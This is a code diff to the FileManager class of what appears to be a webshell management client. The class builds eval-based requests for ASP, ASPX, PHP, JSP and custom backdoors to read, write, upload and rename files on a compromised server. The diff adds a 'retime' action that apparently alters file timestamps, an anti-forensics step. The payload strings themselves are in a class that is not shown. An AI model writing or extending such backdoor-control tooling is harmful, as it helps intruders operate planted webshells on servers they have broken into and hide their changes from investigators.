@@ -166,6 +166,7 @@ public class FileManager {
 				break;
 			case "readfile":
 				params = Safe.PASS+"="+Safe.ASP_MAKE.replace("PAYLOAD", Safe.ASP_READFILE)+"&"+Safe.PARAM1+"="+toHexString(path);
+//				System.out.println(params);
 				break;
 			case "savefile":
 				params = Safe.PASS+"="+Safe.ASP_MAKE.replace("PAYLOAD", Safe.ASP_SAVEFILE)+"&"+Safe.PARAM1+"="+toHexString(path)+"&"+Safe.PARAM2+"="+this.makeParam2(data);
@@ -183,6 +184,9 @@ public class FileManager {
 				break;
 			case "rename":
 				params = Safe.PASS+"="+Safe.ASP_MAKE.replace("PAYLOAD", Safe.ASP_RENAME)+"&"+Safe.PARAM1+"="+this.makeParam2(path)+"&"+Safe.PARAM2+"="+this.makeParam2(data);
+				break;
+			case "retime":
+				params = Safe.PASS+"="+Safe.ASP_MAKE.replace("PAYLOAD", Safe.ASP_RETIME)+"&"+Safe.PARAM1+"="+this.makeParam2(path)+"&"+Safe.PARAM2+"="+this.makeParam2(data);
 				break;
 			case "upload":
 				params = Safe.PASS+"="+Safe.ASP_MAKE.replace("PAYLOAD", Safe.ASP_UPLOAD)+"&"+Safe.PARAM1+"="+toHexString(path)+"&"+Safe.PARAM2+"="+this.makeParam2(data)+"&z3=0";	
@@ -221,13 +225,7 @@ public class FileManager {
 		case "ASPX(Eval)":
 			switch (action) {
 			case "readindex":
-				String path_index = Safe.ASPX_MAKE.replace("PAYLOAD", Safe.ASPX_INDEX);
-				try {
-					params = Safe.PASS + "=" + URLEncoder.encode(path_index, code);
-				} catch (UnsupportedEncodingException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
+				params = Safe.PASS+"="+Safe.ASPX_INDEX+"&"+Safe.PARAM1+"="+this.makeParam2(path);
 				break;
 			case "readdict":
 				params = Safe.PASS+"="+Safe.ASPX_READDICT+"&"+Safe.PARAM1+"="+this.makeParam2(path);
@@ -256,6 +254,9 @@ public class FileManager {
 				break;
 			case "rename":
 				params = Safe.PASS+"="+Safe.ASPX_RENAME+"&"+Safe.PARAM1+"="+this.makeParam1(path)+"&"+Safe.PARAM2+"="+this.makeParam1(data);
+				break;
+			case "retime":
+				params = Safe.PASS+"="+Safe.ASPX_RETIME+"&"+Safe.PARAM1+"="+this.makeParam1(path)+"&"+Safe.PARAM2+"="+this.makeParam1(data);
 				break;
 			case "upload":
 				String param3=null;
@@ -303,6 +304,7 @@ public class FileManager {
 				}
 				break;
 			}
+//			System.out.println(params);
 			break;
 		case "PHP(Eval)":
 			switch (action) {
@@ -327,6 +329,10 @@ public class FileManager {
 				break;
 			case "rename":
 				params = Common.makeParams(Safe.PHP_MAKE, Safe.PHP_RENAME,
+						this.makeParam1(path), this.makeParam2(data));
+				break;
+			case "retime":
+				params = Common.makeParams(Safe.PHP_MAKE, Safe.PHP_RETIME,
 						this.makeParam1(path), this.makeParam2(data));
 				break;
 			case "newdict":
@@ -360,6 +366,9 @@ public class FileManager {
 			case "rename":
 				params = Common.makeParams(Safe.JSP_MAKE, Safe.JSP_RENAME,this.makeParam1(path),this.makeParam2(data))+"&"+Safe.CODE+"="+this.code;
 				break;
+			case "retime":
+				params = Common.makeParams(Safe.JSP_MAKE, Safe.JSP_RETIME,this.makeParam1(path),this.makeParam2(data))+"&"+Safe.CODE+"="+this.code;
+				break;
 			case "newdict":
 				params = Common.makeParams(Safe.JSP_MAKE, Safe.JSP_NEWDICT,this.makeParam1(path))+"&"+Safe.CODE+"="+this.code;
 				break;
@@ -389,6 +398,9 @@ public class FileManager {
 			case "rename":
 				params = Common.makeParams(Safe.CUS_MAKE, Safe.CUS_RENAME,this.makeParam1(path),this.makeParam2(data));
 				break;
+			case "retime":
+				params = Common.makeParams(Safe.CUS_MAKE, Safe.CUS_RETIME,this.makeParam1(path),this.makeParam2(data));
+				break;
 			case "newdict":
 				params = Common.makeParams(Safe.CUS_MAKE, Safe.CUS_NEWDICT,this.makeParam1(path));
 				break;
@@ -398,7 +410,7 @@ public class FileManager {
 			}
 			break;
 		}
-//		System.out.println(params);
+		
 		return Common.send(this.url, params, this.code);
 	}
 
